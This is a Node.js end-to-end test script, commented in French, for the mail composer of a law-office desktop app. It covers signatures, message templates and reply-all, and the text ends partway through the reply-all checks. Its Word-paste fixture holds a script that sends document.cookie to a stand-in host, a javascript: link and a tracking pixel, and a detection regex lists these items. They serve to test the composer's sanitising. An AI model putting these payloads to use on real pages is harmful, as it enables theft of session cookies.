#!/usr/bin/env node
/**
 * J11 étape 4, partie B1 — rédaction dans l'app poste (Tauri), contre l'instance, PowerSync et GreenMail.
 * Prérequis : instance démarrée (`cd instance && docker compose -f docker-compose.yml --env-file ../.env up -d --wait`),
 * `python` pour le client IMAP de contrôle.
 *
 * Prouve, par le DOM de l'app, la base locale, la base du serveur et la boîte IMAP, chacun avec un essai négatif :
 *  1. réponse à tous : destinataires (sans l'adresse du cabinet), objet, historique cité masqué puis affiché ;
 *     une réponse laissée intacte n'est pas enregistrée ;
 *  2. brouillon enregistré automatiquement dans la base locale, porté au serveur par le connecteur du poste,
 *     copie dans le dossier Brouillons du serveur IMAP ;
 *  3. mise en forme simple (gras, italique, listes, lien) ; lien dangereux refusé ;
 *  4. texte collé depuis Word nettoyé (aucun script, style, image ni contenu distant) ;
 *  5. à, cc, cci avec complétion (annuaire, mails reçus) ; saisie invalide refusée ;
 *  6. pièces par glisser-déposer, taille maximale annoncée et appliquée (unitaire et cumulée) ;
 *  7. hors ligne : le brouillon s'écrit sur le poste, le serveur ne le reçoit qu'à la reconnexion ;
 *  8. envoi : refusé sans destinataire ; sinon par la file jusqu'à « copie dans Envoyés confirmée », message reçu
 *     avec In-Reply-To, References, citation, sans Bcc ; brouillon et copie IMAP disparus ;
 *  9. transfert : historique cité, pièces du message d'origine conservées (reçues avec le message) ;
 * 10. reprise : brouillon rouvert depuis le dossier Brouillons, repris sur un second poste ; suppression ;
 * 11. (partie B2) signature par compte, éditée dans Réglages puis insérée dans la réponse, le message neuf et le transfert,
 *     une seule fois, jamais dans un brouillon repris, jamais celle d'un autre compte ;
 * 12. (partie B2) modèles de message créés, modifiés et supprimés dans Réglages, réutilisés dans la rédaction sans
 *     recompiler, sans jamais remplacer du texte écrit sans confirmation ;
 * 13. (partie B2) suggestion de temps tirée d'un mail classé : proposée, jamais enregistrée sans validation, minutes
 *     corrigeables, enregistrée à la validation par le chemin d'écriture des temps (ligne locale puis ligne du serveur).
 * Captures du poste réel : design/captures/j11-mails/redaction-poste-reel-*.png, reglages-messagerie-poste-reel-*.png,
 * temps-mail-poste-reel-*.png.
 */
import { randomUUID } from "node:crypto";
import { mkdirSync, writeFileSync, existsSync, readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { demoAccessToken, demoEmail, demoPassword, totpSecretB32 } from "./lib/demo-auth.mjs";
import { conteneur } from "./lib/moteur-mail.mjs";
import { creerSession, racineInstance, sleep, sqlServeur } from "./lib/poste-session.mjs";

const racine = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
const dossierCaptures = join(racine, "design", "captures", "j11-mails");
const session = creerSession("j11-redaction");
const { api, fail, ok, resetPostes, stopApp, ouvrirPoste, evaluate, fermer } = session;

const marque = String(Date.now()).slice(-6);
const MO = 1024 * 1024;
const imapHote = process.env.LEGALOS_IMAP_HOST ?? "127.0.0.1";
const imapPort = process.env.LEGALOS_IMAP_PORT ?? "13143";
const boite = "demo@cabinet.example";
const lit = (texte) => `'${String(texte).replaceAll("'", "''")}'`;
const norm = (texte) => String(texte).replace(/[  ]/gu, " ").replace(/’/gu, "'");

let send;

// ---------------------------------------------------------------------------------------------
// Aides : API, IMAP, attentes
// ---------------------------------------------------------------------------------------------

async function json(chemin, jeton, methode, corps) {
  const reponse = await fetch(`${api}${chemin}`, {
    method: methode,
    headers: { authorization: `Bearer ${jeton}`, "content-type": "application/json" },
    body: corps === undefined ? undefined : JSON.stringify(corps),
    signal: AbortSignal.timeout(60_000),
  });
  const texte = await reponse.text();
  if (!reponse.ok) fail(`${methode} ${chemin} → ${reponse.status} ${texte.slice(0, 240)}`);
  return texte ? JSON.parse(texte) : {};
}

function motDePasseBoite() {
  if (process.env.LEGALOS_IMAP_PASSWORD) return process.env.LEGALOS_IMAP_PASSWORD;
  const chemin = join(racineInstance(), ".env");
  if (!existsSync(chemin)) fail(".env introuvable (GREENMAIL_PASSWORD)");
  const ligne = readFileSync(chemin, "utf8")
    .split(/\r?\n/)
    .find((l) => l.startsWith("GREENMAIL_PASSWORD="));
  const valeur = ligne?.slice("GREENMAIL_PASSWORD=".length).trim();
  if (!valeur) fail("GREENMAIL_PASSWORD absent de .env");
  return valeur;
}

const SCRIPT_IMAP = [
  "import imaplib, json, os, re, sys, email, email.policy",
  "hote, port, login, action, dossier, cible = sys.argv[1:7]",
  "boite = imaplib.IMAP4(hote, int(port))",
  "boite.login(login, os.environ['IMAP_SECRET'])",
  "if action == 'ajouter':",
  "    typ, _ = boite.append(dossier, None, None, os.environ['IMAP_BRUT'].encode('utf-8'))",
  "    assert typ == 'OK', typ",
  "    print('[]')",
  "elif action == 'chercher':",
  "    typ, _ = boite.select(dossier)",
  "    if typ != 'OK':",
  "        print('[]'); sys.exit(0)",
  "    typ, data = boite.search(None, 'HEADER', 'Message-ID', '\"' + cible + '\"')",
  "    sortie = []",
  "    for num in (data[0].split() if data and data[0] else []):",
  "        typ, brut = boite.fetch(num, '(FLAGS RFC822)')",
  "        tete = brut[0][0].decode('utf-8', 'replace')",
  "        m = re.search(r'FLAGS \\(([^)]*)\\)', tete)",
  "        drapeaux = sorted(m.group(1).split()) if m else []",
  "        msg = email.message_from_bytes(brut[0][1], policy=email.policy.default)",
  "        parties = []",
  "        for p in msg.walk():",
  "            if p.is_multipart(): continue",
  "            ct = p.get_content_type()",
  "            parties.append({'type': ct, 'nom': p.get_filename(), 'texte': p.get_content() if ct.startswith('text/') else ''})",
  "        sortie.append({'drapeaux': drapeaux, 'brut': brut[0][1].decode('utf-8', 'replace'), 'parties': parties})",
  "    print(json.dumps(sortie))",
  "elif action == 'dossiers':",
  "    typ, data = boite.list()",
  "    print(json.dumps([l.decode('utf-8', 'replace').rsplit(' ', 1)[-1].strip('\"') for l in data if l]))",
  "boite.logout()",
].join("\n");

function imap({ action, dossier = "INBOX", cible = "", brut = "" }) {
  const run = spawnSync("python", ["-c", SCRIPT_IMAP, imapHote, imapPort, "demo", action, dossier, cible], {
    encoding: "utf8",
    env: { ...process.env, IMAP_SECRET: motDePasseBoite(), IMAP_BRUT: brut },
  });
  if (run.status !== 0) throw new Error(`imap ${action} ${dossier} : ${(run.stderr || run.stdout).slice(0, 200)}`);
  return JSON.parse(run.stdout || "[]");
}

function dossierBrouillonsImap() {
  const noms = imap({ action: "dossiers" });
  const dernier = (nom) => nom.split(/[/.]/).pop().toLowerCase();
  return noms.find((n) => dernier(n) === "drafts") ?? noms.find((n) => dernier(n) === "brouillons") ?? "Brouillons";
}

const copiesBrouillon = (messageId) => imap({ action: "chercher", dossier: dossierBrouillonsImap(), cible: messageId });

/** Texte décodé (text/plain et text/html) d'un message lu en IMAP, et noms de ses pièces. */
const corpsDe = (copie) => copie.parties.filter((p) => p.type.startsWith("text/")).map((p) => p.texte).join("\n");
const piecesDe = (copie) => copie.parties.map((p) => p.nom).filter(Boolean);

function enTetes(brut) {
  return brut.split(/\r?\n\r?\n/)[0];
}
function valeurEnTete(brut, nom) {
  const m = new RegExp(`^${nom}:[ \\t]*((?:.*)(?:\\r?\\n[ \\t].*)*)`, "im").exec(enTetes(brut));
  return m ? m[1].replace(/\r?\n[ \t]+/g, " ").trim() : "";
}

async function attendre(description, lire, predicat, delai = 60_000) {
  const debut = Date.now();
  let dernier;
  while (Date.now() - debut < delai) {
    try {
      dernier = await lire();
      if (predicat(dernier)) return dernier;
    } catch (err) {
      dernier = err instanceof Error ? err.message : String(err);
    }
    await sleep(400);
  }
  fail(`${description} : délai dépassé (dernière valeur ${JSON.stringify(dernier)})`);
}

function verifier(nom, condition, detail = "") {
  if (!condition) fail(`${nom}${detail === "" ? "" : ` — ${detail}`}`);
}
function essaiNegatif(nom, condition) {
  if (condition) fail(`essai négatif muet : ${nom}`);
}

// ---------------------------------------------------------------------------------------------
// Aides : DOM de l'app (CDP)
// ---------------------------------------------------------------------------------------------

/** Évalue dans la page ; une exception remonte avec sa description complète. */
const js = async (expr) => {
  const msg = await send("Runtime.evaluate", { expression: expr, awaitPromise: true, returnByValue: true });
  const err = msg.result?.exceptionDetails;
  if (err) throw new Error(String(err.exception?.description ?? err.text ?? "évaluation").slice(0, 400));
  return msg.result?.result?.value;
};
const cliquer = (sel) =>
  js(`(() => { const b = document.querySelector(${JSON.stringify(sel)}); if (!b) return false; b.click(); return true; })()`);
const texteDe = async (sel) => String((await js(`document.querySelector(${JSON.stringify(sel)})?.innerText ?? null`)) ?? "");
const present = (sel) => js(`Boolean(document.querySelector(${JSON.stringify(sel)}))`);
const compter = (sel) => js(`document.querySelectorAll(${JSON.stringify(sel)}).length`);
const sqliteLocal = (sql) => js(`window.__legalosRecette.lireSqlite(${JSON.stringify(sql)})`);
const FORM = "[data-testid=mails-redaction]";
const idBrouillon = () => js(`document.querySelector(${JSON.stringify(FORM)})?.getAttribute("data-brouillon-id") ?? null`);
const htmlCorps = () => js(`document.querySelector("[data-testid=redac-corps]")?.innerHTML ?? ""`);
const htmlDe = async (sel) => String((await js(`document.querySelector(${JSON.stringify(sel)})?.innerHTML ?? null`)) ?? "");

/** Saisit dans un champ texte contrôlé par React (valeur native puis événement input). */
const saisir = (sel, valeur) =>
  js(`(() => {
    const el = document.querySelector(${JSON.stringify(sel)});
    if (!el) return false;
    el.focus();
    Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value").set.call(el, ${JSON.stringify(valeur)});
    el.dispatchEvent(new Event("input", { bubbles: true }));
    return true;
  })()`);

/** Choisit une option d'une liste contrôlée par React (valeur native puis événement change). */
const choisirOption = (sel, valeur) =>
  js(`(() => {
    const el = document.querySelector(${JSON.stringify(sel)});
    if (!el) return false;
    Object.getOwnPropertyDescriptor(HTMLSelectElement.prototype, "value").set.call(el, ${JSON.stringify(valeur)});
    el.dispatchEvent(new Event("change", { bubbles: true }));
    return el.value === ${JSON.stringify(valeur)};
  })()`);
const desactive = (sel) => js(`document.querySelector(${JSON.stringify(sel)})?.disabled ?? null`);
const valeurDe = (sel) => js(`document.querySelector(${JSON.stringify(sel)})?.value ?? null`);
const ouvrirReglages = async () => {
  await cliquer("[data-testid=menu-compte]");
  await cliquer("[data-testid=menu-reglages]");
  await attendre("rubrique Messagerie des réglages", () => present("[data-testid=reglages-messagerie]"), Boolean, 30_000);
};
const ouvrirMails = async () => {
  await cliquer("[data-testid=nav-mails]");
  await attendre("écran Mails", () => present("[data-testid=mails-trois-volets]"), Boolean);
};
const ordre = (html, ...morceaux) => {
  const positions = morceaux.map((m) => html.indexOf(m));
  return positions.every((p) => p >= 0) && positions.every((p, i) => i === 0 || positions[i - 1] < p);
};
const occurrences = (texte, motif) => texte.split(motif).length - 1;

async function taper(texte) {
  await send("Input.insertText", { text: texte });
}
async function touche(key, code, vk, texte) {
  const base = { key, code, windowsVirtualKeyCode: vk, nativeVirtualKeyCode: vk };
  await send("Input.dispatchKeyEvent", { type: "keyDown", ...base, ...(texte ? { text: texte } : {}) });
  await send("Input.dispatchKeyEvent", { type: "keyUp", ...base });
}
const entree = () => touche("Enter", "Enter", 13, "\r");
const focusCorps = () => js(`document.querySelector("[data-testid=redac-corps]").focus()`);

async function capturer(nom, theme) {
  mkdirSync(dossierCaptures, { recursive: true });
  await js(`document.documentElement.dataset.theme = ${JSON.stringify(theme)}`);
  await send("Emulation.setDeviceMetricsOverride", { width: 1240, height: 800, deviceScaleFactor: 1, mobile: false });
  await sleep(700);
  const capture = await send("Page.captureScreenshot", { format: "png" });
  const donnees = capture.result?.data;
  if (donnees) writeFileSync(join(dossierCaptures, nom), Buffer.from(donnees, "base64"));
  await send("Emulation.clearDeviceMetricsOverride");
}

/** Dépose des fichiers sur la rédaction (événements dragenter, dragover, drop). */
const deposer = (fichiers) =>
  js(`(() => {
    const dt = new DataTransfer();
    for (const f of ${JSON.stringify(fichiers)}) {
      const octets = f.texte !== undefined ? new TextEncoder().encode(f.texte) : new Uint8Array(f.taille);
      dt.items.add(new File([octets], f.nom, { type: f.type ?? "application/octet-stream" }));
    }
    const form = document.querySelector(${JSON.stringify(FORM)});
    const ev = (type) => form.dispatchEvent(new DragEvent(type, { dataTransfer: dt, bubbles: true, cancelable: true }));
    ev("dragenter"); ev("dragover"); ev("drop");
    return true;
  })()`);

const COLLAGE_WORD = `<html xmlns:o="urn:schemas-microsoft-com:office:office"><head><meta charset="utf-8"><style>p.MsoNormal{margin:0;font-family:Calibri}</style>
<!--[if gte mso 9]><xml><o:OfficeDocumentSettings><o:AllowPNG/></o:OfficeDocumentSettings></xml><![endif]--></head>
<body style='tab-interval:35.4pt'><!--StartFragment-->
<p class=MsoNormal style='margin-bottom:0cm'><b style='mso-bidi-font-weight:normal'><span style='font-size:12.0pt;color:#C00000'>Collage Word ${marque}</span></b><o:p></o:p></p>
<p class=MsoNormal><i>Voir</i> <a href="https://www.legifrance.gouv.fr/x" style="color:blue" onclick="vol()">l'article</a>.</p>
<img src="http://suivi.example/pixel.gif" width=1 height=1>
<script>document.location='http://distant.example/?c='+document.cookie</script>
<p><a href="javascript:alert(1)">piège</a></p>
<!--EndFragment--></body></html>`;

const DEFAUTS = /<script|<img|<style|mso-|MsoNormal|onclick|distant\.example|suivi\.example|javascript:|<o:|<!--/iu;

// ---------------------------------------------------------------------------------------------
// Scénario
// ---------------------------------------------------------------------------------------------

async function main() {
  await session.assurerInstance();
  let jeton = await demoAccessToken(api, `j11-redaction-${marque}`);
  const demoId = await sqlServeur(`SELECT id FROM utilisateurs WHERE email = ${lit(demoEmail)}`);
  if (!demoId) fail("utilisateur démo absent");
  const cabinet = await sqlServeur(`SELECT cabinet_id FROM utilisateurs WHERE id = '${demoId}'`);

  // ----- Données de l'instance (fictives) -----
  const dossierA = randomUUID();
  const creeA = await json("/dossiers", jeton, "POST", {
    id: dossierA,
    idempotence_cle: `j11r-${dossierA}`,
    nom: `Redaction Alpha ${marque}`,
    chemise: "kraft",
    juridiction: "TJ fictif",
    numero_rg: `RG-J11R-${marque}`,
    restreint: false,
  });
  const adressePerso = `j11.redac.${marque}@cabinet.example`;
  await sqlServeur(
    `INSERT INTO comptes_mail (id, cabinet_id, type_compte, titulaire_id, adresse, secret_ref)
     VALUES ('${randomUUID()}', '${cabinet}', 'nominatif', '${demoId}', ${lit(adressePerso)}, 'srv:j11-redaction')`,
  );
  const emailContact = `annuaire.${marque}@example.com`;
  await json("/contacts", jeton, "POST", {
    id: randomUUID(),
    idempotence_cle: `j11r-c-${marque}`,
    nature: "physique",
    nom: `Nom Annuaire ${marque}`,
    type_client: "particulier",
    email: emailContact,
  });

  // Message reçu dans la boîte du cabinet (GreenMail), avec pièce jointe, relevé par le serveur.
  const idMessageRecu = `<j11r-recu-${marque}@tiers.example>`;
  const expediteur = `tiers.${marque}@example.com`;
  const copieTiers = `copie.${marque}@example.com`;
  const objetRecu = `Convocation ${marque}`;
  imap({
    action: "ajouter",
    dossier: "INBOX",
    brut: [
      `From: Me Tiers ${marque} <${expediteur}>`,
      `To: ${boite}`,
      `Cc: ${copieTiers}`,
      `Subject: ${objetRecu}`,
      `Message-ID: ${idMessageRecu}`,
      "MIME-Version: 1.0",
      'Content-Type: multipart/mixed; boundary="limite-j11r"',
      "",
      "--limite-j11r",
      "Content-Type: text/plain; charset=utf-8",
      "",
      `Bonjour, merci de confirmer le creneau ${marque}.`,
      "",
      "Bien cordialement.",
      "--limite-j11r",
      'Content-Type: application/pdf; name="Convocation.pdf"',
      'Content-Disposition: attachment; filename="Convocation.pdf"',
      "Content-Transfer-Encoding: base64",
      "",
      "JVBERi0xLjQK",
      "--limite-j11r--",
      "",
    ].join("\r\n"),
  });
  // Second message, lu seulement (jamais répondu ni transféré) : il sert à la suggestion de temps de la lecture.
  const idMessageLecture = `<j11r-lecture-${marque}@tiers.example>`;
  const objetLecture = `Information ${marque}`;
  imap({
    action: "ajouter",
    dossier: "INBOX",
    brut: [
      `From: Me Autre ${marque} <autre.${marque}@example.com>`,
      `To: ${boite}`,
      `Subject: ${objetLecture}`,
      `Message-ID: ${idMessageLecture}`,
      "MIME-Version: 1.0",
      "Content-Type: text/plain; charset=utf-8",
      "",
      `Pour information, rien à répondre ${marque}.`,
      "",
    ].join("\r\n"),
  });
  // GreenMail n'offre ni CONDSTORE ni QRESYNC : le moteur n'y relève un dépôt qu'au plus toutes les 10 minutes
  // (RELEVE_SANS_REVEIL_SECS). Le redémarrage de l'API force la relève complète initiale, sans attente aléatoire.
  const nomApi = conteneur("legalos-instance-api")[0];
  if (!nomApi) fail("conteneur api absent");
  spawnSync("docker", ["restart", nomApi], { stdio: "inherit" });
  const debutApi = Date.now();
  while (Date.now() - debutApi < 60_000) {
    const etat = await fetch(`${api.slice(0, -"/api".length)}/health`).catch(() => null);
    if (etat?.ok) break;
    await sleep(1000);
  }
  jeton = await demoAccessToken(api, `j11-redaction-apres-${marque}`);
  await json("/messagerie/classement/relever", jeton, "POST");
  const idMessage = await attendre(
    "message relevé",
    () => sqlServeur(`SELECT id FROM messages WHERE message_id = ${lit(idMessageRecu)}`),
    (v) => /^[0-9a-f-]{36}$/u.test(String(v)),
    60_000,
  );

  const idMessageDeux = await attendre(
    "second message relevé",
    () => sqlServeur(`SELECT id FROM messages WHERE message_id = ${lit(idMessageLecture)}`),
    (v) => /^[0-9a-f-]{36}$/u.test(String(v)),
    60_000,
  );

  // La clé de signature des jetons est persistante et son kid en est l'empreinte : le redémarrage de l'API ci-dessus
  // ne change rien pour PowerSync, qui n'est donc plus redémarré (consigne de l'architecte du 20/10/2026).

  // ----- App Tauri (poste A) -----
  resetPostes(["j11ra"]);
  const { child, page } = await ouvrirPoste("j11ra", 9351, {
    email: demoEmail,
    password: demoPassword,
    secret: totpSecretB32,
    nomAppareil: `J11 redaction A ${marque}`,
  });
  send = page.send;
  let posteB = null;
  try {
    await attendre(
      "synchronisation du message",
      () => sqliteLocal(`SELECT COUNT(*) AS n FROM messages WHERE id = '${idMessage}'`),
      (r) => Number(r?.[0]?.n) === 1,
      120_000,
    );
    await attendre(
      "synchronisation du second message",
      () => sqliteLocal(`SELECT COUNT(*) AS n FROM messages WHERE id = '${idMessageDeux}'`),
      (r) => Number(r?.[0]?.n) === 1,
      60_000,
    );
    await attendre(
      "synchronisation du compte",
      () => sqliteLocal(`SELECT COUNT(*) AS n FROM comptes_mail WHERE adresse = ${lit(adressePerso)}`),
      (r) => Number(r?.[0]?.n) === 1,
      60_000,
    );
    // ===== 0. Réglages : une signature par compte, modèles de message (créer, modifier, supprimer) =====
    const compteCabinet = await sqlServeur(`SELECT id FROM comptes_mail WHERE type_compte = 'classement' LIMIT 1`);
    const comptePerso = await sqlServeur(`SELECT id FROM comptes_mail WHERE adresse = ${lit(adressePerso)}`);
    verifier("comptes de l'utilisateur connus du serveur", /^[0-9a-f-]{36}$/u.test(compteCabinet) && /^[0-9a-f-]{36}$/u.test(comptePerso));
    const sigCabinet = `Signature Cabinet ${marque}`;
    const sigCabinetLigne2 = `Avocat fictif ${marque}`;
    const sigPerso = `Signature Perso ${marque}`;
    const blocSig = (compteId) => `[data-testid=signature-compte][data-compte-id="${compteId}"]`;
    const signatureServeur = (compteId) =>
      sqlServeur(`SELECT COALESCE((SELECT html FROM signatures_messagerie WHERE compte_id = '${compteId}' AND utilisateur_id = '${demoId}'), '')`);
    await ouvrirReglages();
    for (const [compteId, adresse] of [[compteCabinet, null], [comptePerso, adressePerso]]) {
      await attendre(`signature du compte ${compteId} chargée`, () => present(`${blocSig(compteId)} [data-testid=reglages-signature-corps]`), Boolean, 30_000);
      if (adresse !== null) verifier("la boîte nominative est nommée avec son adresse", (await texteDe(blocSig(compteId))).includes(adresse));
    }
    verifier("boîte du cabinet nommée", (await texteDe(blocSig(compteCabinet))).includes("Boîte du cabinet"));
    verifier("« Enregistrer la signature » inactif tant que rien n'est modifié", (await desactive(`${blocSig(compteCabinet)} [data-testid=signature-enregistrer]`)) === true);
    const remplacerSignature = async (compteId, lignes, avecGras) => {
      await js(`document.querySelector(${JSON.stringify(`${blocSig(compteId)} [data-testid=reglages-signature-corps]`)}).focus()`);
      await js(`document.execCommand("selectAll")`);
      await touche("Backspace", "Backspace", 8);
      if (avecGras) await cliquer(`${blocSig(compteId)} [data-testid=outil-gras]`);
      await taper(lignes[0]);
      if (avecGras) await cliquer(`${blocSig(compteId)} [data-testid=outil-gras]`);
      for (const ligneSignature of lignes.slice(1)) {
        await entree();
        await taper(ligneSignature);
      }
    };
    await remplacerSignature(compteCabinet, [sigCabinet, sigCabinetLigne2], true);
    await remplacerSignature(comptePerso, [sigPerso], false);
    await attendre("« Enregistrer la signature » actif après modification", () => desactive(`${blocSig(compteCabinet)} [data-testid=signature-enregistrer]`), (d) => d === false, 10_000);
    await sleep(1500);
    essaiNegatif("la signature est enregistrée sans clic sur « Enregistrer »", (await signatureServeur(compteCabinet)).includes(sigCabinet));
    await cliquer(`${blocSig(compteCabinet)} [data-testid=signature-enregistrer]`);
    await attendre("signature du cabinet enregistrée", () => present(`${blocSig(compteCabinet)} [data-testid=signature-enregistree]`), Boolean, 20_000);
    await cliquer(`${blocSig(comptePerso)} [data-testid=signature-enregistrer]`);
    await attendre("signature perso enregistrée", () => present(`${blocSig(comptePerso)} [data-testid=signature-enregistree]`), Boolean, 20_000);
    const htmlSigCabinet = await signatureServeur(compteCabinet);
    verifier("signature du cabinet au serveur, avec sa mise en forme", htmlSigCabinet.includes(`<strong>${sigCabinet}</strong>`) && htmlSigCabinet.includes(sigCabinetLigne2), htmlSigCabinet);
    const htmlSigPerso = await signatureServeur(comptePerso);
    verifier("signature perso au serveur, distincte", htmlSigPerso.includes(sigPerso) && !htmlSigPerso.includes(sigCabinet), htmlSigPerso);
    verifier("après l'enregistrement, le bouton redevient inactif", (await desactive(`${blocSig(compteCabinet)} [data-testid=signature-enregistrer]`)) === true);
    ok("réglages : une signature par boîte, mise en forme simple, enregistrée seulement au clic");

    const nomModele = `Modèle J11 ${marque}`;
    const objetModele = `Objet du modèle ${marque}`;
    const objetModeleModifie = `Objet modifié ${marque}`;
    const texteModele = `Texte du modèle ${marque}`;
    const nomRetire = `Modèle à retirer ${marque}`;
    const ligneModele = (nom) => `[data-testid=modele-ligne][data-nom=${JSON.stringify(nom)}]`;
    const compteModeles = (nom) => sqlServeur(`SELECT COUNT(*) FROM modeles_message WHERE cabinet_id = '${cabinet}' AND nom = ${lit(nom)}`);
    const creerModeleUi = async (nom, objet, texte) => {
      await cliquer("[data-testid=modele-nouveau]");
      await attendre("formulaire du modèle", () => present("[data-testid=modele-formulaire]"), Boolean, 10_000);
      await saisir("[data-testid=modele-nom]", nom);
      await saisir("[data-testid=modele-objet]", objet);
      await js(`document.querySelector("[data-testid=modele-corps]").focus()`);
      await taper(texte);
      await cliquer("[data-testid=modele-enregistrer]");
    };
    // Essai négatif : sans nom, rien n'est créé et l'écran dit pourquoi.
    const modelesAvant = await sqlServeur(`SELECT COUNT(*) FROM modeles_message WHERE cabinet_id = '${cabinet}'`);
    await cliquer("[data-testid=modele-nouveau]");
    await attendre("formulaire du modèle (sans nom)", () => present("[data-testid=modele-formulaire]"), Boolean, 10_000);
    await cliquer("[data-testid=modele-enregistrer]");
    const refusNom = await attendre("refus d'un modèle sans nom", () => texteDe("[data-testid=modele-erreur]"), (t) => t !== "", 10_000);
    verifier("modèle sans nom : la phrase dit pourquoi", norm(refusNom).includes("Donnez un nom au modèle"), refusNom);
    await sleep(800);
    essaiNegatif("un modèle sans nom est créé", (await sqlServeur(`SELECT COUNT(*) FROM modeles_message WHERE cabinet_id = '${cabinet}'`)) !== modelesAvant);
    await cliquer("[data-testid=modele-abandon]");
    // Création, puis nom déjà pris.
    await creerModeleUi(nomModele, objetModele, texteModele);
    await attendre("modèle créé affiché", () => present(ligneModele(nomModele)), Boolean, 20_000);
    verifier("confirmation « Modèle créé »", norm(await texteDe("[data-testid=modele-confirmation]")).includes("Modèle créé"));
    const modeleServeur = await sqlServeur(`SELECT objet || '|' || corps_html FROM modeles_message WHERE cabinet_id = '${cabinet}' AND nom = ${lit(nomModele)}`);
    verifier("le modèle est au serveur avec son objet et son corps", modeleServeur.startsWith(`${objetModele}|`) && modeleServeur.includes(texteModele), modeleServeur);
    await creerModeleUi(nomModele, "autre objet", "autre texte");
    const refusDoublon = await attendre("refus d'un nom déjà pris", () => texteDe("[data-testid=modele-erreur]"), (t) => t !== "", 20_000);
    verifier("nom déjà pris : message du serveur", norm(refusDoublon).includes("porte déjà ce nom"), refusDoublon);
    verifier("aucun doublon au serveur", (await compteModeles(nomModele)) === "1");
    await cliquer("[data-testid=modele-abandon]");
    // Un second modèle, supprimé ensuite (avec confirmation).
    await creerModeleUi(nomRetire, "", "À retirer");
    await attendre("second modèle affiché", () => present(ligneModele(nomRetire)), Boolean, 20_000);
    await cliquer(`${ligneModele(nomRetire)} [data-testid=modele-supprimer]`);
    await attendre("confirmation de suppression", () => present(`${ligneModele(nomRetire)} [data-testid=modele-supprimer-confirmer]`), Boolean, 5_000);
    await js(`[...document.querySelectorAll(${JSON.stringify(`${ligneModele(nomRetire)} button`)})].find((b) => b.innerText.includes("Garder")).click()`);
    await sleep(800);
    verifier("« Garder » : le modèle reste", (await compteModeles(nomRetire)) === "1" && (await present(ligneModele(nomRetire))));
    await cliquer(`${ligneModele(nomRetire)} [data-testid=modele-supprimer]`);
    await cliquer(`${ligneModele(nomRetire)} [data-testid=modele-supprimer-confirmer]`);
    await attendre("modèle supprimé de la liste", () => present(ligneModele(nomRetire)), (v) => v === false, 20_000);
    verifier("modèle supprimé du serveur", (await compteModeles(nomRetire)) === "0");
    // Modification du premier modèle.
    await cliquer(`${ligneModele(nomModele)} [data-testid=modele-modifier]`);
    await attendre("formulaire de modification", () => present("[data-testid=modele-formulaire]"), Boolean, 10_000);
    verifier(
      "le formulaire reprend le modèle",
      (await valeurDe("[data-testid=modele-nom]")) === nomModele &&
        (await valeurDe("[data-testid=modele-objet]")) === objetModele &&
        (await htmlDe("[data-testid=modele-corps]")).includes(texteModele),
    );
    await saisir("[data-testid=modele-objet]", objetModeleModifie);
    await cliquer("[data-testid=modele-enregistrer]");
    await attendre("modèle modifié", () => sqlServeur(`SELECT objet FROM modeles_message WHERE cabinet_id = '${cabinet}' AND nom = ${lit(nomModele)}`), (v) => v === objetModeleModifie, 20_000);
    await attendre("confirmation « Modèle modifié »", () => texteDe("[data-testid=modele-confirmation]"), (t) => norm(t).includes("Modèle modifié"), 10_000);
    await js(`document.querySelector("[data-testid=reglages-messagerie]").scrollIntoView()`);
    await capturer("reglages-messagerie-poste-reel-jour.png", "light");
    await capturer("reglages-messagerie-poste-reel-nuit.png", "dark");
    await js(`document.documentElement.dataset.theme = "light"`);
    ok("réglages : modèles de message créés, modifiés, supprimés (essais négatifs : sans nom, nom pris, « Garder »)");

    await ouvrirMails();
    const ligne = `[data-testid=mail-ligne][data-id="${idMessage}"]`;
    // Le message n'est pas classé : il est dans « À classer » (la boîte de réception de l'utilisateur peut porter d'autres mails).
    await cliquer("[data-testid=vue-a-classer]");
    await attendre("message dans la liste", () => present(ligne), Boolean);
    await cliquer(ligne);
    await attendre("lecture", () => texteDe("[data-testid=lecture-objet]"), (t) => t.includes(objetRecu));

    // ===== 1. Réponse à tous =====
    verifier("dock présent en lecture", (await texteDe("[data-testid=barre-actions]")).includes("Nouveau mail"));
    await cliquer("[data-testid=lecture-repondre-a-tous]");
    await attendre("rédaction ouverte", () => present(FORM), Boolean);
    verifier("la rédaction remplace la lecture", !(await present("[data-testid=mails-lecture]")));
    essaiNegatif("le dock reste affiché pendant la rédaction", await present("[data-testid=barre-actions]"));
    verifier("titre « Répondre à tous »", (await texteDe("[data-testid=redac-titre]")) === "Répondre à tous");
    const adressesChamp = (champ) =>
      js(`[...document.querySelectorAll("[data-testid=puce-${champ}]")].map((p) => p.getAttribute("data-adresse"))`);
    verifier("À : l'expéditeur", JSON.stringify(await adressesChamp("a")) === JSON.stringify([expediteur]), JSON.stringify(await adressesChamp("a")));
    const cc = await adressesChamp("cc");
    verifier("Cc : les autres destinataires", cc.includes(copieTiers), JSON.stringify(cc));
    verifier("Cc : jamais la boîte du cabinet (le serveur la connaît, pas le poste)", !cc.includes(boite), JSON.stringify(cc));
    essaiNegatif("la boîte du cabinet figure en copie", cc.includes(boite));
    verifier("objet « Re : »", (await js(`document.querySelector("[data-testid=redac-objet]").value`)) === `Re : ${objetRecu}`);
    verifier("de : boîte d'envoi du cabinet", norm(await texteDe("[data-testid=redac-de]")).includes("Boîte d'envoi du cabinet"));
    essaiNegatif("(i) une réponse propose de changer le compte d'envoi (il est celui du message d'origine)", await present("select[data-testid=redac-de-choix]"));
    // Signature du compte d'envoi (la boîte du cabinet, celle du message reçu) : une fois, sous le texte, avant l'historique.
    const corpsDepart = await attendre("signature insérée dans la réponse", () => htmlCorps(), (h) => h.includes(sigCabinet), 15_000);
    verifier("signature : ligne « -- », signature, puis historique cité, dans cet ordre", ordre(corpsDepart, "<p>--</p>", sigCabinet, sigCabinetLigne2, "<blockquote>"), corpsDepart);
    verifier("signature : une seule fois", occurrences(corpsDepart, sigCabinet) === 1 && occurrences(corpsDepart, "<p>--</p>") === 1);
    verifier("signature : la mise en forme des réglages est conservée", corpsDepart.includes(`<strong>${sigCabinet}</strong>`));
    verifier("signature : un paragraphe vide au-dessus pour écrire", corpsDepart.startsWith("<p><br"));
    essaiNegatif("la signature d'un autre compte est dans la réponse", corpsDepart.includes(sigPerso));
    const citation = () => js(`(() => { const q = document.querySelector("[data-testid=redac-corps] > blockquote:last-child"); return q ? { affiche: getComputedStyle(q).display !== "none", texte: q.innerText } : null; })()`);
    const q0 = await citation();
    verifier("historique cité présent et masqué au départ", q0 !== null && q0.affiche === false);
